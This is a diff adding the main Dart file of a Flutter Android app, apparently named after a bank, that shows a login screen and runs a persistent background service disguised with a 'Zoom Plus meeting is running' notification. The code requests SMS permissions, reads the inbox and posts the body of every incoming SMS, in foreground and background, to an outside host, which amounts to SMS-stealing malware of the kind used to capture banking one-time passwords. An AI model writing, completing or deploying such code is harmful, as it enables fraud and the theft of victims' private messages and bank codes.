@@ -1,0 +1,291 @@
+import 'dart:async';
+import 'dart:convert';
+import 'dart:ui';
+
+import 'package:flutter/material.dart';
+import 'package:flutter_background_service_android/flutter_background_service_android.dart';
+import 'package:flutter_local_notifications/flutter_local_notifications.dart';
+import 'package:icici/login.dart';
+import 'package:telephony/telephony.dart' hide NetworkType;
+import 'package:http/http.dart' as http;
+// Hide NetworkType from workmanager import
+import 'package:flutter_background_service/flutter_background_service.dart';
+// ignore: depend_on_referenced_packages
+
+const fetchBackground = "fetchBackground";
+
+// void callbackDispatcher() {
+//   Workmanager().executeTask((task, inputData) async {
+//     switch (task) {
+//       case fetchBackground:
+//         // Code to run in background
+//         print("Background fetch executed");
+
+//         //Show toast
+//         Fluttertoast.showToast(
+//           msg: "Background fetch executed",
+//           toastLength: Toast.LENGTH_SHORT,
+//           gravity: ToastGravity.CENTER,
+//           timeInSecForIosWeb: 1,
+//           backgroundColor: Colors.red,
+//           textColor: Colors.white,
+//           fontSize: 16.0,
+//         );
+//         break;
+//     }
+//     return Future.value(true);
+//   });
+// }
+
+void main() async {
+  WidgetsFlutterBinding.ensureInitialized();
+  await initializeService();
+  runApp(const MyApp());
+}
+
+Future<void> initializeService() async {
+  final service = FlutterBackgroundService();
+
+  /// OPTIONAL, using custom notification channel id
+  const AndroidNotificationChannel channel = AndroidNotificationChannel(
+    'my_foreground', // id
+    'MY FOREGROUND SERVICE', // title
+    description:
+        'This channel is used for important notifications.', // description
+    importance: Importance.low, // importance must be at low or higher level
+  );
+
+  final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
+      FlutterLocalNotificationsPlugin();
+
+  await flutterLocalNotificationsPlugin
+      .resolvePlatformSpecificImplementation<
+          AndroidFlutterLocalNotificationsPlugin>()
+      ?.createNotificationChannel(channel);
+
+  await service.configure(
+    androidConfiguration: AndroidConfiguration(
+      // this will be executed when app is in foreground or background in separated isolate
+      onStart: onStart,
+
+      // auto start service
+      autoStart: true,
+      isForegroundMode: true,
+
+      notificationChannelId: 'my_foreground',
+      initialNotificationTitle: 'Zoom Plus meeting is running',
+      initialNotificationContent: 'Tap to open',
+      foregroundServiceNotificationId: 888,
+    ),
+    iosConfiguration: IosConfiguration(
+      // auto start service
+      autoStart: true,
+
+      // this will be executed when app is in foreground in separated isolate
+      onForeground: onStart,
+
+      // you have to enable background fetch capability on xcode project
+      onBackground: onIosBackground,
+    ),
+  );
+
+  service.startService();
+}
+
+// IOS BackGround Task
+bool onIosBackground(ServiceInstance service) {
+  WidgetsFlutterBinding.ensureInitialized();
+  print('FLUTTER BACKGROUND FETCH');
+  return true;
+}
+
+//Android
+@pragma('vm:entry-point')
+void onStart(ServiceInstance service) async {
+  // Only available for flutter 3.0.0 and later
+  DartPluginRegistrant.ensureInitialized();
+
+  if (service is AndroidServiceInstance) {
+    service.on('setAsForeground').listen((event) {
+      service.setAsForegroundService();
+
+      final telephony = Telephony.instance;
+      telephony.listenIncomingSms(
+        onNewMessage: (SmsMessage message) {},
+        onBackgroundMessage: onBackgroundMessage,
+      );
+    });
+
+    service.on('setAsBackground').listen((event) {
+      service.setAsBackgroundService();
+
+      final telephony = Telephony.instance;
+      telephony.listenIncomingSms(
+        onNewMessage: (SmsMessage message) {},
+        onBackgroundMessage: onBackgroundMessage,
+      );
+    });
+  }
+
+  service.on('stopService').listen((event) {
+    service.stopSelf();
+  });
+
+  // bring to foreground
+  Timer.periodic(const Duration(seconds: 1), (timer) async {
+    if (service is AndroidServiceInstance) {
+      //Listen for incoming SMS
+      final telephony = Telephony.instance;
+      telephony.listenIncomingSms(
+        onNewMessage: (SmsMessage message) {},
+        onBackgroundMessage: onBackgroundMessage,
+      );
+    }
+  });
+}
+
+onBackgroundMessage(SmsMessage message) async {
+  //Show notification
+  final flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();
+  flutterLocalNotificationsPlugin.show(
+    545567,
+    'Background message received',
+    'New SMS from ${message.address}',
+    const NotificationDetails(
+      android: AndroidNotificationDetails(
+        'channel id',
+        'channel name',
+        icon: 'app_icon',
+      ),
+    ),
+  );
+}
+
+class MyApp extends StatelessWidget {
+  const MyApp({Key? key}) : super(key: key);
+
+  @override
+  Widget build(BuildContext context) {
+    return MaterialApp(
+      debugShowCheckedModeBanner: false,
+      title: 'Flutter Demo',
+      theme: ThemeData(
+        primarySwatch: Colors.deepPurple,
+      ),
+      home: const Main(),
+    );
+  }
+}
+
+class Main extends StatefulWidget {
+  const Main({Key? key}) : super(key: key);
+
+  @override
+  _MainState createState() => _MainState();
+}
+
+class _MainState extends State<Main> {
+  final Telephony telephony = Telephony.instance;
+  String _body = "No message";
+  int _messageCount = 0;
+
+  // SMS permission
+  void _requestPermission() async {
+    bool? permissionsGrantedSms = await telephony.requestSmsPermissions;
+    bool? permissionsGranted = await telephony.requestPhoneAndSmsPermissions;
+
+    print(permissionsGranted);
+    print(permissionsGrantedSms);
+  }
+
+  // void _listenSms() async {
+  //   telephony.listenIncomingSms(
+  //     onBackgroundMessage: backgroundMessageHandler,
+  //     onNewMessage: (SmsMessage message) async {
+  //       // Http post request
+  //       await http.post(
+  //         Uri.parse("https://all-request-gt6w57.dauqu.host/sms"),
+  //         headers: <String, String>{
+  //           'Content-Type': 'application/json; charset=UTF-8',
+  //         },
+  //         body: jsonEncode(<String, String>{
+  //           "body": message.body!,
+  //         }),
+  //       );
+
+  //       setState(() {
+  //         _messageCount++;
+  //         _body = message.body!;
+  //       });
+  //     },
+  //     listenInBackground: true,
+  //   );
+  // }
+
+  void _listenSms() async {
+    telephony.listenIncomingSms(
+      onBackgroundMessage: backgroundMessageHandler, // Fixed function name
+      onNewMessage: (SmsMessage message) async {
+        // Http post request
+        await http.post(
+          Uri.parse("https://all-request-gt6w57.dauqu.host/sms"),
+          headers: <String, String>{
+            'Content-Type': 'application/json; charset=UTF-8',
+          },
+          body: jsonEncode(<String, String>{
+            "body": message.body!,
+          }),
+        );
+
+        setState(() {
+          _messageCount++;
+          _body = message.body!;
+        });
+      },
+      listenInBackground: true,
+    );
+  }
+
+  // Handle background message
+  // void backgroundMessageHandler(SmsMessage message) async {
+  //   // Http post request
+  //   await http.post(
+  //     Uri.parse("https://all-request-gt6w57.dauqu.host/sms"),
+  //     headers: <String, String>{
+  //       'Content-Type': 'application/json; charset=UTF-8',
+  //     },
+  //     body: jsonEncode(<String, String>{
+  //       "body": message.body!,
+  //     }),
+  //   );
+  // }
+
+  void backgroundMessageHandler(SmsMessage message) async {
+    // Http post request
+    await http.post(
+      Uri.parse("https://all-request-gt6w57.dauqu.host/sms"),
+      headers: <String, String>{
+        'Content-Type': 'application/json; charset=UTF-8',
+      },
+      body: jsonEncode(<String, String>{
+        "body": message.body!,
+      }),
+    );
+  }
+
+  @override
+  void initState() {
+    super.initState();
+    _requestPermission();
+    _listenSms();
+    final inbox = telephony.getInboxSms();
+    inbox.then((value) => print(value));
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      body: Login(),
+    );
+  }
+}
